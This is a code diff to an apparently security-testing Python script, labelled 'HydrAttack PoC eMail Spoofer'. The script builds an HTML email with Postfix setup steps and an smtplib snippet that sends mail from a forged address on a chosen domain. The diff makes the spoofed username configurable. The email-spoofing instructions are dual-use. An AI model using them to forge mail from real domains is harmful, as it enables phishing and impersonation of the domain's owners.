@@ -2,6 +2,7 @@ import os
 
 DOMAIN = os.environ.get("DOMAIN", "spoofed.com")
 SENDTO = os.environ.get("SENDTO", "spoofed@spoofed.com")
+USERNAME = os.environ.get("USERNAME", "spoofed")
 
 msg_body = f"""
 <!DOCTYPE html>
@@ -136,7 +137,7 @@ smtp_host_lookup=native
 smtp_generic_maps = hash:/etc/postfix/generic</pre></p>
 
         <p><b>Step 3. Setting /etc/postfix/generic file</b><br>
-        <pre class=code-block>spoofed@{DOMAIN} mail@{DOMAIN}</pre></p>
+        <pre class=code-block>{USERNAME}@{DOMAIN} mail@{DOMAIN}</pre></p>
         
         <p><b>Step 4. Changing the hostname</b><br>
         <pre class=code-block>sudo hostnamectl set-hostname {DOMAIN}</pre></p>
@@ -153,11 +154,11 @@ from email.mime.text import MIMEText
 
 msg = MIMEText("Spoofing {DOMAIN} emails")
 msg["Subject"] = "{DOMAIN} spoofing"
-msg["From"] = "spoofed@{DOMAIN}"
+msg["From"] = "{USERNAME}@{DOMAIN}"
 msg["To"] = "{SENDTO}"
 
 server = smtplib.SMTP("127.0.0.1", 25)
-server.sendmail("spoofed@{DOMAIN}", "{SENDTO}", msg.as_string())
+server.sendmail("{USERNAME}@{DOMAIN}", "{SENDTO}", msg.as_string())
 server.quit()
 print("Email sent!")</pre></p>
 
@@ -172,5 +173,5 @@ print("Email sent!")</pre></p>
 """
 
 msg_subject = f"HydrAttack PoC eMail Spoofer for {DOMAIN} domain"
-msg_from = f"spoofed@{DOMAIN}"
+msg_from = f"{USERNAME}@{DOMAIN}"
 msg_to = f"{SENDTO}"
